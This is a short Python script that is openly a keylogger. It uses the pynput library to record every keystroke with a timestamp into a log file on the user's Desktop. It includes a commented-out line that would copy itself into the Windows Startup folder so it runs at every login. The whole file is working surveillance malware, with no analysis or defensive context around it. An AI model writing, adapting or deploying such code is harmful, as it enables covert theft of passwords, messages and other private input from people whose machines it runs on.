from pynput.keyboard import Listener

import os
import logging
from shutil import copyfile

username = os.getlogin()

logging_directory = f"C:/Users/{username}/Desktop"
#copyfile('keylogger.py', f'C:/Users/{username}/AppData/Roaming/microsoft/Start Menu/Startup/keylogger.py') 
#this line allows this to be run on startup automatically

logging.basicConfig(filename=f"{logging_directory}/mylog.txt", level=logging.DEBUG, format= "%(asctime)s: %(message)s")

def key_handler(key):
    logging.info(key)

with Listener(on_press=key_handler) as listener:
    listener.join()    